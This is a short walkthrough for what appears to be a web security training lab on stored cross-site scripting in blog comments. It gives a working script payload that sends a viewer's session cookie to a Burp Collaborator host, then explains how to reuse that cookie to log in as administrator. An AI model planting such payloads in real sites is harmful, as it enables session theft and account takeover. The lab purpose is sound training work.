This lab contains a stored XSS vulnerability in the blog comments function. A simulated victim user views all comments after they are posted. To solve the lab, exploit the vulnerability to exfiltrate the victim's session cookie, then use this cookie to impersonate the victim.


Use collaborator to open a server, and using the following code paste your URL next to fetch:

This script will make anyone who views the comment issue a POST request containing their cookie to your subdomain on the public Collaborator server.


`<script>
fetch('https://BURP-COLLABORATOR-SUBDOMAIN', {
method: 'POST',
mode: 'no-cors',
body:document.cookie
});
</script>`

Paste it in the comment and you will get administrator's account cookie in a request, copy and paste it in your request of /my-account and you will be logged as an administrator.
